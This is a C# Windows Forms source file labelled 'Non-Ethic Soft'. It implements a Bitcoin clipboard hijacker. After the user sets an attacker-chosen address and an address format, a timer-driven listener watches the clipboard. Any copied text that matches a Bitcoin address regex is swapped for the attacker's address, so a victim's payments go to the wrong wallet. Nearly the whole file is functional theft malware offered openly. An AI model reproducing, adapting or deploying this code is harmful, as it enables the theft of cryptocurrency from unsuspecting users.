using System;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

/*
 * Non-Ethic Soft
 * Author: NFC
*/

namespace CCH
{
    public partial class Form1 : Form
    {
        Regex btcaddr = null;

        public Form1()
        {
            InitializeComponent();
        }

        private Regex BTC_Format()
        {
            Regex re = null;

            if (comboBTC.Text == "P2PKH")
            {
                re = new Regex("^[1][a-zA-Z0-9]{26,35}$");
            }
            else if (comboBTC.Text == "P2SH")
            {
                re = new Regex("^[3][a-zA-Z0-9]{26,35}$");
            }
            else if (comboBTC.Text == "Bech32")
            {
                re = new Regex("^(bc1)([a-z0-9]){38,62}$");
            }
            return re;
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (Listener.Enabled)
            {
                MessageBox.Show("Program is already running!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return; 
            }

            string address = textBTC.Text.Trim();
            
            if (String.IsNullOrEmpty(address))
            {
                MessageBox.Show("Address field is empty!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
            else
            {
                btcaddr = BTC_Format();

                if (btcaddr != null)
                {
                    if (!btcaddr.IsMatch(address))
                    {
                        MessageBox.Show("Wrong input!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        textBTC.Clear();
                    }
                    else
                    {
                        MessageBox.Show("Clipboard is monitored!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        Listener.Start();
                    }
                }
                else
                {
                    MessageBox.Show("You haven't selected address format!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }
        }

        private void Swap()
        {
            try
            {
                Clipboard.SetDataObject(textBTC.Text, false, 0, 0);
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message);
            }
        }

        private void Get_Clipboard(object sender, EventArgs e)
        {
            string copied = Clipboard.GetText().Trim();

            if (btcaddr.IsMatch(copied))
               Swap();            
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            if (Listener.Enabled)
            {
                MessageBox.Show("Monitoring stopped!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Listener.Stop();
            }
        }

        private void btnQuit_Click(object sender, EventArgs e)
        {
            Application.Exit(); 
        }
    }
}
